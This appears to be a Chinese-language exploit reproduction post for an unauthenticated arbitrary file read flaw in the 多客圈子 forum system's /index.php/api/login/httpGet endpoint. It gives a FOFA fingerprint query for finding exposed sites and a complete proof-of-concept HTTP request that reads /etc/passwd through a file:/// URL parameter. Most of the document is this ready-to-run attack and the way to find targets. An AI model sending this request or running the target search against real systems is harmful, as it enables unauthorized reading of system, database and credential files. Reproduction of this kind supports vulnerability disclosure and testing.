## 多客圈子论坛系统httpGet任意文件读取漏洞复现

多客圈子论坛系统 /index.php/api/login/httpGet 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```
body="/static/index/js/jweixin-1.2.0.js"
```

## poc

```
GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406101451766.png)